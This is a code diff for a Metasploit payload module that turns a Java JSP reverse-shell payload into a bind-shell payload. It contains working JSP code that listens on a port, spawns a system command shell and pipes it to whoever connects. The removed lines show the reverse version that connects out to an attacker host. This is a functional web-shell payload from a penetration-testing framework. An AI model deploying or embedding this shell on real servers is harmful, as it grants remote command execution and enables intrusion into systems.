@@ -11,7 +11,7 @@
 
 
 require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
+require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 
 
@@ -21,14 +21,14 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'Java JSP Command Shell, Reverse TCP Inline',
+			'Name'          => 'Java JSP Command Shell, Bind TCP Inline',
 			'Version'       => '$Revision$',
-			'Description'   => 'Connect back to attacker and spawn a command shell',
+			'Description'   => 'Listen for a connection and spawn a command shell',
 			'Author'        => [ 'sf' ],
 			'License'       => MSF_LICENSE,
 			'Platform'      => [ 'win', 'osx', 'linux', 'unix', 'solaris' ],
 			'Arch'          => ARCH_JAVA,
-			'Handler'       => Msf::Handler::ReverseTcp,
+			'Handler'       => Msf::Handler::BindTcp,
 			'Session'       => Msf::Sessions::CommandShell,
 			'Payload'       =>
 				{
@@ -41,7 +41,7 @@ module Metasploit3
 	
 
 	def generate
-		# JSP Reverse Shell modified from: http://www.security.org.sg/code/jspreverse.html
+		# Modified from: http://www.security.org.sg/code/jspreverse.html
 		jsp = %q{
 			<%@page import="java.lang.*"%>
 			<%@page import="java.util.*"%>
@@ -88,19 +88,15 @@ module Metasploit3
 
 				try
 				{
-					Socket socket = new Socket( "LHOST", LPORT );
+					ServerSocket server_socket = new ServerSocket( LPORT );
+					Socket client_socket = server_socket.accept();
+					server_socket.close();
 					Process process = Runtime.getRuntime().exec( "SHELL" );
-					( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
-					( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+					( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
+					( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
 				} catch( Exception e ) {}
 			%>
 		}
-		
-		if( !datastore['LHOST'] or datastore['LHOST'].empty? )
-			return super
-		end
-		
-		jsp = jsp.gsub( "LHOST", datastore['LHOST'] )
 		
 		jsp = jsp.gsub( "LPORT", datastore['LPORT'].to_s )
 		
